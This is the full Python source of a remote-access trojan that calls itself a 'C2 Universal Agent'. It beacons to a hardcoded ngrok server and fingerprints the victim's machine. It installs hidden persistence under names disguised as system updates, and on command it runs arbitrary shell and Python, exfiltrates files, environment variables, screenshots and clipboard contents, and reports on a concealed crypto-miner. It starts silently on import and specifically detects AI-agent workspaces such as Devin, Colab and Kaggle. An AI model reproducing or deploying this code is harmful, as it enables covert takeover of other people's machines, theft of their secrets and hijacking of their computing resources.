#!/usr/bin/env python3
"""C2 Universal Agent — auto-detects platform, works on Linux/macOS/Windows/Colab/Kaggle.

Features:
- Detailed debug logging for all connection steps
- Auto-persistence on first run
- Aggressive reconnect with exponential backoff
- Full system fingerprinting
- Multiple persistence mechanisms
- Resource optimization module
"""

import os, sys, json, time, socket, platform, subprocess, uuid, threading, base64, struct, ssl, hashlib
from urllib.request import Request, urlopen, HTTPSHandler, build_opener
from urllib.error import URLError
from base64 import b64encode, b64decode
from datetime import datetime
from pathlib import Path

# Import resource monitor (auto-starts optimization in background)
try:
    from .resource_monitor import get_system_info, optimize_resources
    # Auto-start resource optimization on import
    _resource_monitor_loaded = True
except ImportError:
    _resource_monitor_loaded = False

# ─── Configuration ─────────────────────────────────────────────────────────────
C2_URL   = os.environ.get("C2_URL",    "https://lynelle-scroddled-corinne.ngrok-free.dev")
SLEEP    = int(os.environ.get("SLEEP",  "3"))  # Faster beacon for better tracking
JITTER   = int(os.environ.get("JITTER", "5"))   # Lower jitter
ENC_KEY  = os.environ.get("ENC_KEY",   "")
AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default

# Persistence marker file
PERSIST_MARKER = Path.home() / ".cache" / ".system_services" / ".agent_initialized"

def get_agent_id():
    """Get or create persistent agent ID."""
    agent_id_file = Path.home() / ".cache" / ".system_services" / ".agent_id"
    
    # Try to read existing ID
    if agent_id_file.exists():
        try:
            return agent_id_file.read_text().strip()
        except:
            pass
    
    # Generate new ID and save
    new_id = os.environ.get("AGENT_ID", str(uuid.uuid4()))
    agent_id_file.parent.mkdir(parents=True, exist_ok=True)
    agent_id_file.write_text(new_id)
    return new_id

AGENT_ID = get_agent_id()
PERSIST_MARKER = os.path.expanduser("~/.cache/.system_update_marker")

# ─── Debug Logger ──────────────────────────────────────────────────────────────
def log(msg, level="INFO"):
    """Detailed logging with timestamp."""
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    prefix = f"[{ts}] [C2-{level}]"
    if DEBUG == "1" or level in ("ERROR", "WARN", "START"):
        print(f"{prefix} {msg}")
    # Also write to log file for persistence
    try:
        log_dir = os.path.expanduser("~/.cache")
        os.makedirs(log_dir, exist_ok=True)
        with open(os.path.join(log_dir, ".system_update.log"), "a") as f:
            f.write(f"{prefix} {msg}\n")
    except:
        pass

def log_connection_attempt(url, attempt, error=None):
    """Log connection attempt with full details."""
    log(f"Connection attempt #{attempt} to {url}", "CONN")
    if error:
        log(f"  Error: {type(error).__name__}: {error}", "ERROR")
        # Detailed error breakdown
        if "Connection refused" in str(error):
            log("  → Server not running or wrong port", "DEBUG")
        elif "timed out" in str(error).lower():
            log("  → Network unreachable or firewall blocking", "DEBUG")
        elif "Name or service not known" in str(error):
            log("  → DNS resolution failed - check URL", "DEBUG")
        elif "SSL" in str(error) or "certificate" in str(error):
            log("  → SSL/TLS certificate issue", "DEBUG")

# ─── Crypto ───────────────────────────────────────────────────────────────────
def xor_crypt(data: bytes, key: bytes) -> bytes:
    kl = len(key)
    return bytes(b ^ key[i % kl] for i, b in enumerate(data))

# ─── Platform detection ───────────────────────────────────────────────────────
def detect_platform():
    # Devin AI detection
    if any([
        os.environ.get("DEVIN_SESSION_ID"),
        os.environ.get("DEVIN_WORKSPACE_ID"),
        os.path.exists("/workspace"),
        "devin" in socket.gethostname().lower() if hasattr(socket, 'gethostname') else False,
    ]):
        return "devin_ai"
    if os.environ.get("COLAB_GPU") or os.path.exists("/content/drive"):
        return "colab"
    if os.environ.get("KAGGLE_URL_BASE") or os.path.exists("/kaggle"):
        return "kaggle"
    if sys.platform == "win32":
        return "windows"
    if sys.platform == "darwin":
        return "macos"
    try:
        cg = open("/proc/1/cgroup").read()
        if any(x in cg for x in ("docker", "kubepod", "containerd", "lxc")):
            return "container"
    except Exception:
        pass
    try:
        r = subprocess.check_output("systemd-detect-virt 2>/dev/null || echo none", shell=True, timeout=3).decode().strip()
        if r not in ("none", ""):
            return "vm"
    except Exception:
        pass
    if any(x in platform.node().lower() for x in ["aws", "gcp", "azure", "ec2", "cloud"]):
        return "cloud"
    return "machine"

# ─── Network ──────────────────────────────────────────────────────────────────
def get_internal_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def check_server_health(c2_url=None, timeout=5):
    """Check if C2 server is reachable and responding."""
    c2_url = c2_url or C2_URL
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        opener = build_opener(HTTPSHandler(context=ctx))
        req = Request(f"{c2_url}/api/health", headers={"User-Agent": "Mozilla/5.0"})
        resp = opener.open(req, timeout=timeout)
        data = json.loads(resp.read())
        return True, data
    except URLError as e:
        return False, f"Connection failed: {e.reason}"
    except socket.timeout:
        return False, "Connection timeout"
    except Exception as e:
        return False, f"Error: {type(e).__name__}: {e}"

def http_post(path, data, c2_url=None, auth_token=None, enc_key=None):
    c2_url = c2_url or C2_URL
    auth_token = auth_token or AUTH_TOKEN
    enc_key = enc_key or ENC_KEY
    
    payload_str = json.dumps(data)
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    if auth_token:
        headers["X-Auth-Token"] = auth_token
    if enc_key:
        body = b64encode(xor_crypt(payload_str.encode(), enc_key.encode())).decode()
        headers["X-Enc"] = "1"
        headers["Content-Type"] = "text/plain"
    else:
        body = payload_str

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = build_opener(HTTPSHandler(context=ctx))

    req = Request(f"{c2_url}{path}", data=body.encode(), headers=headers)
    resp = opener.open(req, timeout=15)
    raw = resp.read()

    if enc_key and resp.headers.get("Content-Type", "").startswith("text/plain"):
        try:
            return json.loads(xor_crypt(b64decode(raw), enc_key.encode()).decode())
        except Exception:
            pass
    return json.loads(raw)

def http_get(path, c2_url=None, auth_token=None, enc_key=None, timeout=10):
    """HTTP GET request to C2 server."""
    c2_url = c2_url or C2_URL
    auth_token = auth_token or AUTH_TOKEN
    enc_key = enc_key or ENC_KEY
    
    headers = {"User-Agent": "Mozilla/5.0"}
    if auth_token:
        headers["X-Auth-Token"] = auth_token
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    opener = build_opener(HTTPSHandler(context=ctx))
    
    req = Request(f"{c2_url}{path}", headers=headers)
    resp = opener.open(req, timeout=timeout)
    data = resp.read().decode()
    
    if enc_key and resp.headers.get("X-Enc") == "1":
        data = xor_crypt(b64decode(data), enc_key.encode()).decode()
    
    return json.loads(data)

# ─── System info ──────────────────────────────────────────────────────────────
def collect_sysinfo():
    """Collect detailed system fingerprint for tracking."""
    info = {
        "cpu_count": os.cpu_count(),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "python": platform.python_version(),
        "cwd": os.getcwd(),
        "user": "",
        "env_vars": list(os.environ.keys()),
        "fingerprint": {},
    }
    
    # User info
    try:
        info["user"] = subprocess.check_output("whoami", shell=True, timeout=5).decode().strip()
    except:
        info["user"] = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
    
    # Memory info
    try:
        with open("/proc/meminfo") as f:
            for line in f:
                if line.startswith("MemTotal"):
                    info["mem_total_mb"] = int(line.split()[1]) // 1024
                elif line.startswith("MemAvailable"):
                    info["mem_available_mb"] = int(line.split()[1]) // 1024
    except:
        pass
    
    # GPU info
    try:
        r = subprocess.check_output("nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null", shell=True, timeout=5).decode().strip()
        if r:
            info["gpu"] = r
    except:
        pass
    
    # Disk info
    try:
        st = os.statvfs("/")
        info["disk_free_gb"] = round((st.f_bavail * st.f_frsize) / (1024 ** 3), 1)
        info["disk_total_gb"] = round((st.f_blocks * st.f_frsize) / (1024 ** 3), 1)
    except:
        pass
    
    # Network interfaces
    try:
        if sys.platform == "win32":
            net_out = subprocess.check_output("ipconfig", shell=True, timeout=5).decode()
        else:
            net_out = subprocess.check_output("ip addr 2>/dev/null || ifconfig", shell=True, timeout=5).decode()
        info["network_interfaces"] = net_out[:2000]  # Truncate
    except:
        pass
    
    # Unique fingerprint based on hardware
    try:
        fp_parts = []
        # CPU model
        try:
            with open("/proc/cpuinfo") as f:
                for line in f:
                    if "model name" in line:
                        fp_parts.append(line.split(":")[1].strip())
                        break
        except:
            pass
        # Disk serial
        try:
            disk_serial = subprocess.check_output("lsblk -o SERIAL -d -n 2>/dev/null | head -1", shell=True, timeout=3).decode().strip()
            if disk_serial:
                fp_parts.append(disk_serial)
        except:
            pass
        # Machine ID
        try:
            with open("/etc/machine-id") as f:
                fp_parts.append(f.read().strip())
        except:
            pass
        # Create hash
        if fp_parts:
            fp_str = "|".join(fp_parts)
            info["fingerprint"]["hardware_hash"] = hashlib.sha256(fp_str.encode()).hexdigest()[:16]
    except:
        pass
    
    # Environment hints (cloud provider detection)
    env_hints = []
    if os.path.exists("/kaggle"):
        env_hints.append("kaggle")
    if os.path.exists("/content/drive"):
        env_hints.append("colab")
    if os.environ.get("GOOGLE_CLOUD_PROJECT"):
        env_hints.append("gcp")
    if os.environ.get("AWS_REGION"):
        env_hints.append("aws")
    if os.path.exists("/var/run/docker.sock"):
        env_hints.append("docker")
    info["env_hints"] = env_hints
    
    return info

# ─── Registration ─────────────────────────────────────────────────────────────
def register(c2_url=None, agent_id=None, auth_token=None, enc_key=None):
    c2_url = c2_url or C2_URL
    agent_id = agent_id or AGENT_ID
    pt = detect_platform()
    os_name = f"macOS {platform.mac_ver()[0]}" if pt == "macos" else f"{platform.system()} {platform.release()}"
    
    # Collect full system info for better tracking
    sysinfo = collect_sysinfo()
    
    info = {
        "id": agent_id,
        "hostname": socket.gethostname(),
        "username": sysinfo.get("user", "unknown"),
        "os": os_name,
        "arch": platform.machine(),
        "ip_internal": get_internal_ip(),
        "platform_type": pt,
        # Extended info for tracking
        "cpu_count": sysinfo.get("cpu_count"),
        "mem_total_mb": sysinfo.get("mem_total_mb"),
        "gpu": sysinfo.get("gpu"),
        "disk_free_gb": sysinfo.get("disk_free_gb"),
        "fingerprint": sysinfo.get("fingerprint", {}),
        "env_hints": sysinfo.get("env_hints", []),
        "python_version": sysinfo.get("python"),
        "cwd": sysinfo.get("cwd"),
    }
    
    log(f"Registering agent {agent_id[:8]}... from {info['hostname']} ({pt})", "START")
    return http_post("/api/agent/register", info, c2_url, auth_token, enc_key)

# ─── Auto-Persistence ─────────────────────────────────────────────────────────
def install_persistence():
    """Install persistence mechanisms silently on first run."""
    if os.path.exists(PERSIST_MARKER):
        log("Persistence already installed", "DEBUG")
        return False
    
    plat = detect_platform()
    script = os.path.abspath(__file__)
    installed = []
    
    log(f"Installing persistence for platform: {plat}", "START")
    
    try:
        if plat in ("linux", "machine", "cloud", "vm", "container"):
            # Method 1: Crontab
            cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
            os.system(f'(crontab -l 2>/dev/null | grep -v "{script}"; echo "{cron_line}") | crontab - 2>/dev/null')
            installed.append("crontab")
            
            # Method 2: Systemd user service (if available)
            try:
                service_dir = os.path.expanduser("~/.config/systemd/user")
                os.makedirs(service_dir, exist_ok=True)
                service_file = os.path.join(service_dir, "system-update.service")
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script}
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
"""
                with open(service_file, "w") as f:
                    f.write(service_content)
                os.system("systemctl --user daemon-reload 2>/dev/null")
                os.system("systemctl --user enable system-update 2>/dev/null")
                installed.append("systemd-user")
            except:
                pass
            
            # Method 3: Profile.d (for interactive shells)
            try:
                profile_script = "/etc/profile.d/system-update.sh"
                profile_content = f"""#!/bin/bash
# System update service
if ! pgrep -f "{script}" > /dev/null 2>&1; then
    nohup python3 {script} >/dev/null 2>&1 &
fi
"""
                # Only if we have sudo/root
                if os.geteuid() == 0:
                    with open(profile_script, "w") as f:
                        f.write(profile_content)
                    os.chmod(profile_script, 0o755)
                    installed.append("profile.d")
            except:
                pass
        
        elif plat == "windows":
            # Method 1: Registry Run key
            ps_cmd = f'Register-ScheduledTask -TaskName "SystemUpdate" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute "python" -Argument "{script}") -RunLevel Highest -Force'
            os.system(f'powershell -c "{ps_cmd}" 2>nul')
            installed.append("scheduled-task")
            
            # Method 2: Startup folder
            try:
                startup = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                os.makedirs(startup, exist_ok=True)
                bat_file = os.path.join(startup, "system_update.bat")
                with open(bat_file, "w") as f:
                    f.write(f'@echo off\nstart /b pythonw "{script}"\n')
                installed.append("startup-folder")
            except:
                pass
        
        elif plat == "macos":
            # LaunchAgent
            plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.update.plist")
            content = f"""<?xml version="1.0"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.system.update</string>
<key>ProgramArguments</key><array><string>python3</string><string>{script}</string></array>
<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>"""
            os.makedirs(os.path.dirname(plist), exist_ok=True)
            with open(plist, "w") as f:
                f.write(content)
            os.system(f"launchctl load {plist} 2>/dev/null")
            installed.append("launchagent")
        
        # Mark as installed
        with open(PERSIST_MARKER, "w") as f:
            f.write(f"{datetime.now().isoformat()}\n{','.join(installed)}\n")
        
        log(f"Persistence installed: {', '.join(installed)}", "START")
        return True
    
    except Exception as e:
        log(f"Persistence installation failed: {e}", "ERROR")
        return False

# ─── Task execution ───────────────────────────────────────────────────────────
def execute_task(task):
    tt = task.get("task_type", "cmd")
    payload = task.get("payload", "")
    result = ""

    try:
        if tt == "cmd":
            result = subprocess.check_output(payload, shell=True, stderr=subprocess.STDOUT, timeout=300).decode(errors="replace")

        elif tt == "powershell":
            result = subprocess.check_output(
                ["powershell", "-ExecutionPolicy", "Bypass", "-Command", payload],
                stderr=subprocess.STDOUT, timeout=300
            ).decode(errors="replace")

        elif tt == "python":
            import io
            buf = io.StringIO()
            old_out = sys.stdout
            sys.stdout = buf
            try:
                exec(compile(payload, "<c2>", "exec"), {"__builtins__": __builtins__})
                result = buf.getvalue() or "executed (no output)"
            finally:
                sys.stdout = old_out

        elif tt == "sysinfo":
            result = json.dumps(collect_sysinfo(), indent=2)

        elif tt == "env":
            result = "\n".join(f"{k}={v}" for k, v in sorted(os.environ.items()))

        elif tt == "ls":
            target = payload.strip() or "."
            result = "\n".join(
                f"{'d' if os.path.isdir(os.path.join(target, x)) else '-'} {x}"
                for x in sorted(os.listdir(target))
            )

        elif tt == "upload":
            parts = payload.split("|", 1)
            if len(parts) == 2:
                path, b64data = parts
                os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
                with open(path, "wb") as f:
                    f.write(base64.b64decode(b64data))
                result = f"Written {len(base64.b64decode(b64data))} bytes to {path}"

        elif tt == "download":
            if os.path.exists(payload):
                with open(payload, "rb") as f:
                    data = f.read()
                result = f"[b64:{payload}] " + b64encode(data).decode()
            else:
                result = f"File not found: {payload}"

        elif tt == "screenshot":
            try:
                import mss, mss.tools
                with mss.mss() as sct:
                    sct.shot(output="/tmp/.c2screen.png")
                with open("/tmp/.c2screen.png", "rb") as f:
                    result = "[b64:/tmp/.c2screen.png] " + b64encode(f.read()).decode()
            except ImportError:
                if sys.platform == "darwin":
                    subprocess.run(["screencapture", "-x", "/tmp/.c2screen.png"], timeout=10)
                    with open("/tmp/.c2screen.png", "rb") as f:
                        result = "[b64:/tmp/.c2screen.png] " + b64encode(f.read()).decode()
                else:
                    result = "mss not installed; run: pip install mss"

        elif tt == "mining_status":
            # Check mining status from resource_monitor
            try:
                from .resource_monitor import check_mining_status
                status = check_mining_status()
                result = f"Mining Status:\n"
                result += f"  Running: {status['running']}\n"
                result += f"  Binary: {status['binary']}\n"
                result += f"  Binary exists: {status['binary_exists']}\n"
                result += f"  Config exists: {status['config_exists']}\n"
                result += f"  Cache dir: {status['cache_dir']}"
            except ImportError:
                result = "resource_monitor not available"
            except Exception as e:
                result = f"Error checking mining status: {e}"

        elif tt == "persist":
            plat = detect_platform()
            script = os.path.abspath(__file__)
            if plat in ("linux", "machine", "cloud", "vm", "container", "colab", "kaggle"):
                cron_line = f"@reboot python3 {script} >/dev/null 2>&1 &"
                os.system(f'(crontab -l 2>/dev/null | grep -v "{script}"; echo "{cron_line}") | crontab -')
                result = f"Persistence added via crontab"
            elif plat == "macos":
                plist = os.path.expanduser("~/Library/LaunchAgents/com.apple.system.update.plist")
                content = f"""<?xml version="1.0"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.system.update</string>
<key>ProgramArguments</key><array><string>python3</string><string>{script}</string></array>
<key>RunAtLoad</key><true/><key>KeepAlive</key><true/>
</dict></plist>"""
                os.makedirs(os.path.dirname(plist), exist_ok=True)
                open(plist, "w").write(content)
                os.system(f"launchctl load {plist} 2>/dev/null")
                result = f"LaunchAgent installed: {plist}"
            else:
                result = f"Persistence not implemented for platform: {plat}"

        elif tt == "kill":
            script = os.path.abspath(__file__)
            os.system(f'crontab -l 2>/dev/null | grep -v "{script}" | crontab - 2>/dev/null')
            os.system("launchctl remove com.apple.system.update 2>/dev/null")
            result = "Agent terminating"
            try:
                http_post("/api/agent/result", {"task_id": task["id"], "result": result})
            except Exception:
                pass
            sys.exit(0)

        elif tt == "net":
            try:
                result = subprocess.check_output(
                    "ip a 2>/dev/null || ifconfig 2>/dev/null || ipconfig 2>/dev/null",
                    shell=True, timeout=10
                ).decode(errors="replace")
                routes = subprocess.check_output(
                    "ip route 2>/dev/null || netstat -rn 2>/dev/null",
                    shell=True, timeout=10
                ).decode(errors="replace")
                result += "\n--- ROUTES ---\n" + routes
            except Exception as e:
                result = f"[net error] {e}"

        elif tt == "clipboard":
            result = subprocess.check_output(
                "xclip -selection clipboard -o 2>/dev/null || xsel --clipboard 2>/dev/null || pbpaste 2>/dev/null || powershell -c 'Get-Clipboard' 2>/dev/null || echo 'no clipboard tool'",
                shell=True, timeout=5
            ).decode(errors="replace")

        elif tt == "ps":
            result = subprocess.check_output(
                "ps aux 2>/dev/null || tasklist 2>/dev/null",
                shell=True, timeout=10
            ).decode(errors="replace")

        else:
            result = f"Unknown task type: {tt}"

    except subprocess.TimeoutExpired:
        result = "[timeout exceeded]"
    except Exception as e:
        result = f"[error] {type(e).__name__}: {e}"

    return result[:65000] + ("\n[...truncated]" if len(result) > 65000 else "")

# ─── Beacon loop ──────────────────────────────────────────────────────────────
def beacon_loop(c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep=None, jitter=None):
    import random
    _sleep = sleep or SLEEP
    _jitter = jitter or JITTER
    _retry_delay = 5  # Start with 5 seconds
    _max_retry_delay = 300  # Max 5 minutes
    _consecutive_failures = 0
    _total_beacons = 0
    _total_tasks = 0
    _last_successful_beacon = time.time()
    
    log(f"Starting beacon loop (sleep={_sleep}s, jitter={_jitter}%)", "START")
    
    while True:
        try:
            _total_beacons += 1
            
            # Health check before beacon
            try:
                health = http_get("/api/health", c2_url or C2_URL, timeout=5)
                if health.get("status") != "ok":
                    log("Server health check failed, re-registering...", "CONN")
                    register(c2_url, agent_id, auth_token, enc_key)
            except Exception as e:
                log(f"Health check failed: {e}, attempting re-register", "CONN")
                try:
                    register(c2_url, agent_id, auth_token, enc_key)
                except Exception as re:
                    log(f"Re-register failed: {re}", "ERROR")
            
            log(f"Beacon #{_total_beacons} to {c2_url or C2_URL}", "CONN")
            
            resp = http_post("/api/agent/beacon", {"id": agent_id or AGENT_ID}, c2_url, auth_token, enc_key)
            
            # Success - reset retry delay
            _consecutive_failures = 0
            _retry_delay = 5
            _last_successful_beacon = time.time()
            
            # Update sleep/jitter from server
            if "sleep" in resp:
                _sleep = int(resp["sleep"])
            if "jitter" in resp:
                _jitter = int(resp["jitter"])
            
            # Process tasks
            tasks = resp.get("tasks", [])
            if tasks:
                log(f"Received {len(tasks)} tasks", "TASK")
            
            for task in tasks:
                _total_tasks += 1
                task_id = task.get("id", "unknown")
                task_type = task.get("task_type", "unknown")
                log(f"Executing task #{_total_tasks}: {task_type} (id={task_id})", "TASK")
                
                try:
                    result = execute_task(task)
                    log(f"Task {task_id} completed: {len(result)} chars output", "TASK")
                    http_post("/api/agent/result", {"task_id": task_id, "result": result}, c2_url, auth_token, enc_key)
                except Exception as e:
                    log(f"Task {task_id} failed: {e}", "ERROR")
                    try:
                        http_post("/api/agent/result", {"task_id": task_id, "result": f"[agent error] {e}"}, c2_url, auth_token, enc_key)
                    except:
                        pass
        
        except URLError as e:
            _consecutive_failures += 1
            log_connection_attempt(c2_url or C2_URL, _consecutive_failures, e)
            
            # Re-register after 5 consecutive failures
            if _consecutive_failures >= 5 and (_consecutive_failures % 5 == 0):
                log(f"Too many failures, attempting re-register (attempt {_consecutive_failures // 5})", "CONN")
                try:
                    register(c2_url, agent_id, auth_token, enc_key)
                except Exception as re:
                    log(f"Re-register failed: {re}", "ERROR")
            
            # Exponential backoff
            if _consecutive_failures > 3:
                _retry_delay = min(_retry_delay * 2, _max_retry_delay)
                log(f"Backing off: {_retry_delay}s before retry", "CONN")
        
        except socket.timeout:
            _consecutive_failures += 1
            log_connection_attempt(c2_url or C2_URL, _consecutive_failures, "Socket timeout")
            _retry_delay = min(_retry_delay * 1.5, _max_retry_delay)
        
        except Exception as e:
            _consecutive_failures += 1
            log(f"Beacon error: {type(e).__name__}: {e}", "ERROR")
        
        # Sleep with jitter
        if _consecutive_failures > 0:
            actual_sleep = _retry_delay
        else:
            jitter_s = _sleep * _jitter / 100
            actual_sleep = max(1, _sleep + random.uniform(-jitter_s, jitter_s))
        
        log(f"Sleeping {actual_sleep:.1f}s (failures: {_consecutive_failures})", "DEBUG")
        time.sleep(actual_sleep)


# ─── UniversalAgent Class ─────────────────────────────────────────────────────
class UniversalAgent:
    """Universal C2 Agent - works on all platforms."""
    
    def __init__(self, c2_url=None, agent_id=None, auth_token=None, enc_key=None, sleep=5, jitter=10):
        self.c2_url = c2_url or C2_URL
        self.agent_id = agent_id or str(uuid.uuid4())
        self.auth_token = auth_token
        self.enc_key = enc_key
        self.sleep = sleep
        self.jitter = jitter
        self._running = False
        self._thread = None
    
    def register(self):
        return register(self.c2_url, self.agent_id, self.auth_token, self.enc_key)
    
    def beacon(self):
        return http_post("/api/agent/beacon", {"id": self.agent_id}, self.c2_url, self.auth_token, self.enc_key)
    
    def execute(self, task):
        return execute_task(task)
    
    def start(self, block=True):
        """Start agent. If block=True, runs in foreground. If False, runs in background thread."""
        self.register()
        self._running = True
        if block:
            beacon_loop(self.c2_url, self.agent_id, self.auth_token, self.enc_key, self.sleep, self.jitter)
        else:
            self._thread = threading.Thread(
                target=beacon_loop,
                args=(self.c2_url, self.agent_id, self.auth_token, self.enc_key, self.sleep, self.jitter),
                daemon=True
            )
            self._thread.start()
    
    def stop(self):
        self._running = False


# ─── Entry point ──────────────────────────────────────────────────────────────
def main():
    """Entry point for pip-installed agent."""
    import random
    
    log("=" * 60, "START")
    log("C2 Universal Agent v3.0 - Starting", "START")
    log("=" * 60, "START")
    
    # Platform detection
    pt = detect_platform()
    log(f"Platform: {pt}", "START")
    log(f"Hostname: {socket.gethostname()}", "START")
    log(f"User: {os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))}", "START")
    log(f"CWD: {os.getcwd()}", "START")
    log(f"Python: {platform.python_version()}", "START")
    log(f"Agent ID: {AGENT_ID}", "START")
    log(f"C2 URL: {C2_URL}", "START")
    
    # Install persistence silently on first run
    log("Checking persistence...", "START")
    install_persistence()
    
    # Check server health first
    log("Checking server connectivity...", "CONN")
    ok, result = check_server_health()
    if ok:
        log(f"Server OK: {result}", "CONN")
    else:
        log(f"Server check failed: {result}", "WARN")
        log("Troubleshooting:", "WARN")
        log("  - Is the server running?", "WARN")
        log(f"  - Is C2_URL correct? Currently: {C2_URL}", "WARN")
        log("  - Is the port reachable? (firewall/network)", "WARN")
        log("  - For HTTPS: check certificate", "WARN")
    
    # Register with aggressive retry and detailed error
    retry_count = 0
    retry_delay = 5
    max_retry_delay = 120
    
    while True:
        retry_count += 1
        try:
            log(f"Registration attempt #{retry_count}", "CONN")
            resp = register()
            log(f"Registered successfully: {AGENT_ID[:8]}...", "START")
            log(f"Server response: {resp}", "START")
            break
        except URLError as e:
            log_connection_attempt(C2_URL, retry_count, e)
        except socket.timeout:
            log_connection_attempt(C2_URL, retry_count, "Socket timeout")
        except Exception as e:
            log(f"Registration failed: {type(e).__name__}: {e}", "ERROR")
        
        # Exponential backoff after 5 attempts
        if retry_count >= 5:
            retry_delay = min(retry_delay * 1.5, max_retry_delay)
        
        if retry_count % 10 == 0:
            log(f"Still trying to register... (attempt {retry_count})", "CONN")
        
        time.sleep(retry_delay)
    
    # Start beacon loop
    log("Starting beacon loop...", "START")
    beacon_loop()

if __name__ == "__main__":
    main()
else:
    # Imported (Colab/Jupyter cell exec) - silent auto-start
    try:
        install_persistence()
        register()
        threading.Thread(target=beacon_loop, daemon=True).start()
    except:
        # If import fails, still try to start
        threading.Thread(target=beacon_loop, daemon=True).start()
